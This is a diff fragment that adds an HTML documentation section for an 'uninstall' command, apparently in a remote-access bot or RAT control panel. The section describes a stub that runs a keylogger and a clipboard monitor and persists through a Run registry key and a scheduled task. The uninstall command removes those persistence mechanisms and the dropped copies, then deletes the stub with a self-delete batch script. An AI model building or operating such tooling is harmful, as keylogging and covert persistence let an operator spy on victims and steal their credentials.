+  </div>
+</div>
+
+<!-- ════════════════════════════════════════ UNINSTALL ══ -->
+<div class="docs-section">
+  <div class="docs-h2">Command Reference — Uninstall</div>
+  <div class="docs-card">
+    <table class="docs-table">
+      <thead><tr><th style="width:160px">Command</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>uninstall</td><td>Fully remove the stub from the target machine: stops keylogger and clipboard monitor, deletes the Run registry key, deletes the scheduled task, deletes the protector copy and drop copy (if different from current EXE), then writes a self-delete batch script and exits. The EXE is deleted ~3 seconds after the process exits. Bot goes offline permanently unless manually re-deployed.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="docs-note">Run <code>uninstall</code> at the end of every test session to leave the target machine clean.</div>
 </div>
 
 </div><!-- /docs-wrap -->
